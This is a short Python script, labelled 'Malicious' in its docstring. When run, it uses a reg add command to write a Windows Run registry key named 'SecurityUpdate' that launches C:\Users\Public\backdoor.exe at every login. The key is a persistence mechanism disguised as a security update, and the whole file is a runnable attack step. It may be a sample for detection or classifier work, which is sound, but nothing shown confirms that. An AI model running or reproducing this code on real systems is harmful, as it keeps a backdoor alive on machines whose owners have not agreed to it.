"""Malicious: Adds Run registry key for persistence."""
import subprocess

def add_run_key():
    cmd = 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v SecurityUpdate /t REG_SZ /d "C:\\Users\\Public\\backdoor.exe" /f'
    subprocess.run(cmd, shell=True)

add_run_key()
